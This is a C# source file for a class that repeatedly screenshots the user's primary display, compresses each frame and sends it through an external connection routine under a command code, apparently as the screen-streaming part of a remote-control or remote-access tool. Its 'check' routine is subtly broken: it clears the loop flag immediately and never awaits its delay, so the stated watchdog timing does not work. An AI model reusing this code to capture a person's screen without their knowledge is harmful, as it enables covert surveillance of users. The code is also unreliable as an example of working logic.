using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;


namespace ConsoleApplication5
{
    public static class Desktop
    {
        private static bool keepGoing = false;
        private static int sleeptime = 1000;
        private static long quality = 75L;
        private static long compress = 75L;  

        public static void setQuality(long q) {
            quality = q; 
        }
        public static void setCompress(long c) { 
            compress = c ; 
        }
        public static void setSleep(int s) {
            sleeptime = s; 
        }

        public static void work() {
            keepGoing = true;
           
            Task.Factory.StartNew(()=>check());
            do {
                Bitmap img = GetScreenShot();
                ImageCodecInfo[] codec = ImageCodecInfo.GetImageEncoders();

                // initialisation d'un tableau de dimension 2 de parametres d'encodages 
                EncoderParameters encodeurs = new EncoderParameters(2);
                // parametre qualite
                EncoderParameter qualite = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality,quality);
                // Parametre compression 
                EncoderParameter compression = new EncoderParameter(System.Drawing.Imaging.Encoder.Compression, compress);
                // remplir tableau parametre
                encodeurs.Param[0] = qualite;
                encodeurs.Param[1] = compression;

                using (MemoryStream stm = new MemoryStream())
                {
                    img.Save(stm, codec[1], encodeurs);
                    if (Cnx.sendArray(stm.ToArray(), "04")) { Console.WriteLine("success ");  }
                    
                }

                Thread.Sleep(sleeptime);
            } while (keepGoing);

        }

        public static void check() {
            while (keepGoing)
            {
                keepGoing = false;
                Task.Delay(30000);
            }
        }

        public static void stop() {
            keepGoing = false; 
        } 

        public static void setKeepGoing() {
            keepGoing = true; 
        }

        public static bool isWorking() {
            return keepGoing; 
        }

        public static Bitmap GetScreenShot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            }

            return bitmap;
        }



    }
}
